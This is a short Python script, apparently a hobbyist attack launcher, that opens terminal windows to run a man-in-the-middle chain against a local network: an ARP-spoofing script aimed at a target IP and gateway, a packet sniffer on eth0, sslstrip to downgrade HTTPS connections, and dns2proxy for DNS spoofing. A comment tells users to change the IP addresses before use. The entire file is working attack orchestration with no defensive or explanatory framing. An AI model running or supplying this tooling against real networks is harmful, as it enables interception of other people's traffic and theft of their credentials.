import os

#if you use the code you change the ip adress in code

os.system("gnome-terminal -e 'python mitm.py -i 192.168.31.131 -p 192.168.31.2'")
os.system("gnome-terminal -e 'python PacketListener.py -i eth0'")
os.system("gnome-terminal -e 'sslstrip'")
os.system("gnome-terminal --working-directory=dns2proxy -e 'python dns2proxy.py'")
